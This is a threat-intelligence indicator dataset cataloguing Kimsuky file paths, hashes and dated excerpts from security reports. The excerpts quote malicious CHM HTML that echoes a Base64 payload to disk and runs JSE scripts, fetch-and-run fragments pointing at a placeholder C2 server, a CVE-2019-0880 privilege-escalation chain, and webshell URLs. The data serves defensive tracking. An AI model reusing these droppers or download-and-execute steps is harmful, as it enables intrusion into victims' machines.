1.0.0,actor--kimsuky,artifact--sha256:dc70b931658e191fbf7b0584b9e62a4463449327c5f886e9c63c7f6ac39c141b,observation--sha256:ea00f187f0e513f81fd3605b8400ab09ae2688d48823801425b775c6b5c2a904,file-path,%Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到,%Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:43d3811975e83739763ca0100fd2037fa2367c005a0e1b38bf0a79e4916c97d1,observation--sha256:c0cf9ec47e959863551886a2b344b2c1c84c4986ecbc18285389667c66bd0939,file-path,%Temp%\speed1.dll 通过注入的方式以高权限执行。,%Temp%\speed1.dll 通过注入的方式以高权限执行。,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:41ff3afa6879868bc3757bcf450f0c6b98887b64ad6458965a764ff630f4ba2d,observation--sha256:299bb271b5edecc0cab28b7e7368ae9efdaacecf6269de01a771b50b9c1b41df,file-path,%Temp%\speed3.exe （ 间 谍 模 块 ） 复 制 到 系 统 目 录,%Temp%\speed3.exe （ 间 谍 模 块 ） 复 制 到 系 统 目 录,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:7ea7927587b80d2688252ae53789bc8f0543ee2f753fa2d232c4cc13edaa4aac,observation--sha256:60d97af69b29454223defd944930722436b3ed954585485530e68f837962e1e6,file-path,%USERPROFILE%\Links\Document.dat,%USERPROFILE%\Links\Document.dat,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:7ea7927587b80d2688252ae53789bc8f0543ee2f753fa2d232c4cc13edaa4aac,observation--sha256:d303ee884e64da3a148a31a8a8713d952187100f56cf89731aab4bd5bb1f52b9,file-path,%USERPROFILE%\Links\Document.dat,%USERPROFILE%\Links\Document.dat,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:43ba4ffeb6f3a9f2d5c5f3156c5808d9db72ee02c057af78bd8ad12d58f67e79,observation--sha256:fd433cfa755bd0f09bcd41f5d4a01e948ff4db3dbb05451aa0f5192f88798c9d,file-path,%USERPROFILE%\Links\Document.jse,%USERPROFILE%\Links\Document.jse,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:43ba4ffeb6f3a9f2d5c5f3156c5808d9db72ee02c057af78bd8ad12d58f67e79,observation--sha256:cae8bdfc7ff096491a2e6bc1253bd9ed3f2ddc92f8efb364150afe950aee9677,file-path,%USERPROFILE%\Links\Document.jse,%USERPROFILE%\Links\Document.jse,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:fc50662a0e2209e2996e58cf5222a0182894eb3c01edeb5d3671745f00f7238b,observation--sha256:df2a8fdea2395e0e3ffea4d93be12afe027579bca5ad1e9287ec28ed97643710,file-path,%USERPROFILE%\Links\Document.vbs,%USERPROFILE%\Links\Document.vbs,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:fc50662a0e2209e2996e58cf5222a0182894eb3c01edeb5d3671745f00f7238b,observation--sha256:440d42bb70523faec56577995b0b5e1156c359863a497f9b3591fe42249aee0a,file-path,%USERPROFILE%\Links\Document.vbs,%USERPROFILE%\Links\Document.vbs,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 55}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.9. HTML코드유사도 ○ HTML 파일의 경우, VBS 1/2, JSE 1 유형 모두 코드 구조는 유사하지만, 악성스크립트파일로VBS 파일에서JSE 파일을사용하는변화를확인할수있습니다. ○또한, JSE 2 유형부터는HTML 파일에악성스크립트를포함시키지않고악성JSE파일 자체를 CHM 파일에 컴파일해 사용했습니다. 그에 따라 HTML 코드도 달라진것을확인할수있습니다. VBS1 JSE1 <OBJECTid=shortcutclassid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" width=1height=1><PARAMname=""Command"" value=""ShortCut""><PARAMname=""Button"" value=""Bitmap:shortcut""><PARAMname=""Item1"" value=',cmd, /cecho[BASE64Code] >""%USERPROFILE%\Links\Document.dat"" &",
1.0.0,actor--kimsuky,artifact--sha256:eab6bb3a4f4b9814d2cc025405396e6930e5ddaa3fd8c4f08bda1ef7935dc661,observation--sha256:e75ded68ab17b0a82551747aa3c8b0d30f790781ad96eeaa7fcc294b14988584,file-path,%systemroot%\explor,%systemroot%\explor,candidate,2020-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TARGET2CURRENT_PROCESSTIME TARGET1PARENT_PROCESS 11:27:59 0.0.0.0:57318 This is an IP to which a phishing URL impersonating the Ministry of Unification has been mapped, and recently, a URL for Naver phishing has been mapped as well. There are also many malicious URLs mapped. 2020.08 ~ 2020.09 2020.12 ~ 2021.03 There is evidence that the Kimsuky organization attempted to connect to 78 IPs through RDP at a domestic transit point (KR) from February 2023 to April 2023. mstsc.exe %systemroot%\system3",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c25fb6f128dce1e2298f7fc0a9aa831479e918b03e4392390f2b92d08bfe560f,observation--sha256:b1d6677e3d082a3bb6b244ab4c50b626c78ce23fc56f3da448875eb4e89f7c43,file-path,%systemroot%\system32\,%systemroot%\system32\,candidate,2020-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TARGET2CURRENT_PROCESSTIME TARGET1PARENT_PROCESS 11:27:59 0.0.0.0:57318 This is an IP to which a phishing URL impersonating the Ministry of Unification has been mapped, and recently, a URL for Naver phishing has been mapped as well. There are also many malicious URLs mapped. 2020.08 ~ 2020.09 2020.12 ~ 2021.03 There is evidence that the Kimsuky organization attempted to connect to 78 IPs through RDP at a domestic transit point (KR) from February 2023 to April 2023. mstsc.exe %systemroot%\system3",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:48275324e1baeb8fd695fadaef2642a0b9742a49db597fcea8cacbbcee7c2d3b,observation--sha256:c6215a4b84c59b7881942263473951293de2e57ebf0e0f5a6d25304a27a37bc0,file-path,%tmp%\advupdate.exe,%tmp%\advupdate.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:4724e970051bec99c2234f67f13a5b32c6fccbaf1c20f6e4d589b114de42ec05,observation--sha256:fad0c3df57e24f6625bf9a96b58fb4d72b648143b15565da90c24823068f1779,file-path,%tmp%\advupdate.exe[C2Server] &start%tmp%\advupdate.exe,%tmp%\advupdate.exe[C2Server] &start%tmp%\advupdate.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:d26df06ef7440c5cb6023b0114e7730a0fc3931973d97a22f07f380d5e04e311,observation--sha256:7dcde492a1a29867b1b6a6eff4792a653a922454bff26c4124161b53feefd903,file-path,%tmp%\alg.exe,%tmp%\alg.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:9eea95ed4e9ba6aa43d52ed0a25f52d7371c9b76951a1b61d403ab46980f3a64,observation--sha256:31659d8644d24cc7ef5ab333c9a22dcd5a240769d5d1e7e99b2558efe02b79b6,file-path,%tmp%\alg.exe[C2Server] &start%tmp%\alg.exe,%tmp%\alg.exe[C2Server] &start%tmp%\alg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:d2b8da13719b7a5e97872767632722b7120d5abf8d7e951ca8e076b0d934bfb6,observation--sha256:a41f202272cd0264deabb509faa2d3f18caf3ffdf3f77f3d9f9ea0db5d404613,file-path,%tmp%\audiodg.exe%tmp%\csrss.exe%tmp%\lsass.exe%tmp%\sihost.exe,%tmp%\audiodg.exe%tmp%\csrss.exe%tmp%\lsass.exe%tmp%\sihost.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:8d9bafd7f2c8d2254a4ce4f23b975faed6dcd7c92d233df3f2298190ece3e103,observation--sha256:0ab6a5064ce54d14e13a2a13a1e7d9e9e55faeb13b6dfdc2bcb7d422ecf9bd62,file-path,%tmp%\audiodg.exe[C2Server] &start%tmp%\audiodg.exe,%tmp%\audiodg.exe[C2Server] &start%tmp%\audiodg.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 56}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport </SCRIPT> inner;A.Click(); inner ='<OBJECTid=""B""classid=""clsid:52a2aaae-085d-4187-97ea-8c30db990436"" style=""visibility:hidden"">';inner +='<PARAMname=""Command""value=""ShortCut""><PARAMname=""Button""value=""Bitmap:shortcut"">';inner +='<PARAMname=""Item1""value="",wscript,C:\\Users\\Public\\Libraries\\Docs.jseP""><PARAMname=""Item2""value=""273,1,1""></OBJECT>';document.getElementById('par').innerHTML=inner;B.Click(); </script> [표4-3] HTML코드유사도 4.10. Powershell 코드유사도 ○VBS 와JSE 유형모두Pow",
1.0.0,actor--kimsuky,artifact--sha256:fa98171a9c4281cde5b3fba9bea0af79ed11cc40ce2996489bb78c01231f13ad,observation--sha256:161a6fbc16183ca026ee45d86bfd850f088cbc5b2d802c47862ae9dfcf126b6e,file-path,%tmp%\ctfmon.exe%tmp%\sihost.exe,%tmp%\ctfmon.exe%tmp%\sihost.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:7ae2197bea60016d0471a546650f1b858f08871dfcc568855dfbf7e9d82d38d4,observation--sha256:004ee9182313a4e916bdce172dd9cc5d27c0bab4dd04dcb46df17053001c33ed,file-path,/etc/letsencrypt/live/nid-security.com/cert.pem,/etc/letsencrypt/live/nid-security.com/cert.pem,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 669}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,SSLCertificateFile /etc/letsencrypt/live/nid-security.com/cert.pem,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3a518752c0c847ac949a9006e75e57c6243dfc3fd25b61cffff59fe325ed51c0,observation--sha256:4ba7420e6fe4f71998b3c16b42be7466b531b7a66e965073ecf03d40ab22075e,file-path,/home/bl,/home/bl,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5909db2cb5004e33013c8a4f2c6e3a15f32114218bb5d721b0152ac0e09db3cd,observation--sha256:4a2089911737472d748acb12216b4f4ffaeeabd9c22e87ae112a949b99f00a94,file-path,/home/hosting_,/home/hosting_,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:99ca7c31ec151539c89dba36dcd6b99e17c93cca89d18f7793a9c96f6cb92a97,observation--sha256:d5df7b4c5f8965cc4f5e4ac42335e7e0a7edb0f7cdd827b68540fe385f349e5a,file-path,/home/ksign/agent,/home/ksign/agent,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 225}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,/home/ksign/agent,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d85e9abaecaabfd42c472e9cb8779c9a690e2adcfae19e3c5b53dedf0b1c3b80,observation--sha256:4e9b96864c51a113ab0e58a45a4cc23d53cbd2c957dc8ebc86e5759e61eb9271,file-path,/home/nam,/home/nam,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c155cef34a77ce7e815fcdeb10d724c0db9e0440b71c43dbc42bddf4239ba5c1,observation--sha256:cd7ea0f3c5a019b62e552e17400c8ed97efbcae5921681c9d517544d43c7b5df,file-path,/home/ssktool/public_ht,/home/ssktool/public_ht,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 